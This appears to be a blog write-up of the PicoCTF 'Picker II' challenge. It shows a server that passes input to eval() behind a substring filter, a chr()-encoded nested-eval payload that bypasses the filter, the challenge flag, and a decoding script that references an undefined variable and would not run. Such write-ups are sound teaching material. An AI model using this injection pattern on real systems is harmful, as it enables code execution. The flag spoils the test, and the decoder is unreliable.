<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>PicoCTF: Picker II | 0xtaxyneno</title>
<meta name=keywords content="picoctf"><meta name=description content="Navigating around a simple substring check."><meta name=author content="David"><link rel=canonical href=http://localhost:1313/posts/picker2/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/picker2/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="PicoCTF: Picker II"><meta property="og:description" content="Navigating around a simple substring check."><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/picker2/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-04T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-04T00:00:00+00:00"><meta property="og:site_name" content="0xTaxyneno"><meta name=twitter:card content="summary"><meta name=twitter:title content="PicoCTF: Picker II"><meta name=twitter:description content="Navigating around a simple substring check."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"PicoCTF: Picker II","item":"http://localhost:1313/posts/picker2/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"PicoCTF: Picker II","name":"PicoCTF: Picker II","description":"Navigating around a simple substring check.","keywords":["picoctf"],"articleBody":"Investigating the Source Code In this challenge, we are provided with the source code of the script directly.\nHere are the interesting snippets of the source code:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def filter(user_input): if 'win' in user_input: return False return True while(True): try: user_input = input('==\u003e ') if( filter(user_input) ): eval(user_input + '()') else: print('Illegal input') except Exception as e: print(e) break It looks like the entrypoint for the server uses a helper function, filter(), to determine if the user is trying to call the win() function.\nThe important thing to note is that the code assumes any input past the filter() function is valid, so it does not perform any additional checks.\nSo, we just need to get the user_input variable to evaluate to the string “win” when the server executes our Python code.\nThe Nested Eval Approach Intuition We know that we need the user_input variable to evaluate to “win” after the server executes our code. So, we can provide as input an eval() function that evaluates to “win”.\nImplementation In this case, I just had a short line of code that converted the ASCII values of “w”, “i”, “n” to their respective characters, and added them into the single word “win”.\n1 eval(chr(119) + chr(105) + chr(110)) # win On the server, this essentially gets represented like below:\n1 eval(eval(chr(119) + chr(105) + chr(110)) + '()') After the nested eval() call, the server essentially executes the below code, which outputs the flag:\n1 eval(\"win\" + '()') # -\u003e eval(\"win()\") Cleaning Up the Flag Similar to Picker I, the output of the flag is a space separated string of hex codes:\n1 0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d So, we can write a tiny Python script to clean up this text and output the flag:\n1 2 3 4 5 6 7 flag = \"0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d\" flag = flag.split(\" \") print(\"\".join(chr(int(word, 16)) for char in flag if char != \"\") # picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590} ","wordCount":"444","inLanguage":"en","datePublished":"2024-09-04T00:00:00Z","dateModified":"2024-09-04T00:00:00Z","author":{"@type":"Person","name":"David"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/picker2/"},"publisher":{"@type":"Organization","name":"0xtaxyneno","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="0xTaxyneno (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>0xTaxyneno</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/ title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">PicoCTF: Picker II</h1><div class=post-meta><span title='2024-09-04 00:00:00 +0000 UTC'>September 4, 2024</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;David</div></header><div class=post-content><h1 id=investigating-the-source-code>Investigating the Source Code<a hidden class=anchor aria-hidden=true href=#investigating-the-source-code>#</a></h1><p>In this challenge, we are provided with the source code of the script directly.</p><p>Here are the interesting snippets of the source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python3 data-lang=python3><span class=line><span class=cl><span class=k>def</span> <span class=nf>filter</span><span class=p>(</span><span class=n>user_input</span><span class=p>):</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=s1>&#39;win&#39;</span> <span class=ow>in</span> <span class=n>user_input</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span><span class=p>(</span><span class=kc>True</span><span class=p>):</span>
</span></span><span class=line><span class=cl>  <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>user_input</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s1>&#39;==&gt; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span> <span class=nb>filter</span><span class=p>(</span><span class=n>user_input</span><span class=p>)</span> <span class=p>):</span>
</span></span><span class=line><span class=cl>      <span class=nb>eval</span><span class=p>(</span><span class=n>user_input</span> <span class=o>+</span> <span class=s1>&#39;()&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Illegal input&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><p>It looks like the entrypoint for the server uses a helper function, <code>filter()</code>, to determine if the user is trying to call the <code>win()</code> function.</p><p>The important thing to note is that the code assumes any input past the <code>filter()</code> function is valid, so it does not perform any additional checks.</p><p>So, we just need to get the <code>user_input</code> variable to evaluate to the string &ldquo;win&rdquo; when the server executes our Python code.</p><h1 id=the-nested-eval-approach>The Nested Eval Approach<a hidden class=anchor aria-hidden=true href=#the-nested-eval-approach>#</a></h1><h2 id=intuition>Intuition<a hidden class=anchor aria-hidden=true href=#intuition>#</a></h2><p>We know that we need the <code>user_input</code> variable to evaluate to &ldquo;win&rdquo; after the server executes our code. So, we can provide as input an <code>eval()</code> function that evaluates to &ldquo;win&rdquo;.</p><h2 id=implementation>Implementation<a hidden class=anchor aria-hidden=true href=#implementation>#</a></h2><p>In this case, I just had a short line of code that converted the ASCII values of &ldquo;w&rdquo;, &ldquo;i&rdquo;, &ldquo;n&rdquo; to their respective characters, and added them into the single word &ldquo;win&rdquo;.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python3 data-lang=python3><span class=line><span class=cl><span class=nb>eval</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=mi>119</span><span class=p>)</span> <span class=o>+</span> <span class=nb>chr</span><span class=p>(</span><span class=mi>105</span><span class=p>)</span> <span class=o>+</span> <span class=nb>chr</span><span class=p>(</span><span class=mi>110</span><span class=p>))</span> <span class=c1># win</span>
</span></span></code></pre></td></tr></table></div></div><p>On the server, this essentially gets represented like below:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python3 data-lang=python3><span class=line><span class=cl><span class=nb>eval</span><span class=p>(</span><span class=nb>eval</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=mi>119</span><span class=p>)</span> <span class=o>+</span> <span class=nb>chr</span><span class=p>(</span><span class=mi>105</span><span class=p>)</span> <span class=o>+</span> <span class=nb>chr</span><span class=p>(</span><span class=mi>110</span><span class=p>))</span> <span class=o>+</span> <span class=s1>&#39;()&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>After the nested <code>eval()</code> call, the server essentially executes the below code, which outputs the flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python3 data-lang=python3><span class=line><span class=cl><span class=nb>eval</span><span class=p>(</span><span class=s2>&#34;win&#34;</span> <span class=o>+</span> <span class=s1>&#39;()&#39;</span><span class=p>)</span> <span class=c1># -&gt; eval(&#34;win()&#34;)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=cleaning-up-the-flag>Cleaning Up the Flag<a hidden class=anchor aria-hidden=true href=#cleaning-up-the-flag>#</a></h2><p>Similar to Picker I, the output of the flag is a space separated string of hex codes:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d
</span></span></code></pre></td></tr></table></div></div><p>So, we can write a tiny Python script to clean up this text and output the flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python3 data-lang=python3><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x39 0x35 0x64 0x34 0x34 0x35 0x39 0x30 0x7d&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>flag</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>word</span><span class=p>,</span> <span class=mi>16</span><span class=p>))</span> <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>flag</span> <span class=k>if</span> <span class=n>char</span> <span class=o>!=</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}</span>
</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/picoctf/>Picoctf</a></li></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/picker1/><span class=title>« Prev</span><br><span>PicoCTF: Picker I</span>
</a><a class=next href=http://localhost:1313/posts/picker3/><span class=title>Next »</span><br><span>PicoCTF: Picker III</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=http://localhost:1313/>0xtaxyneno</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>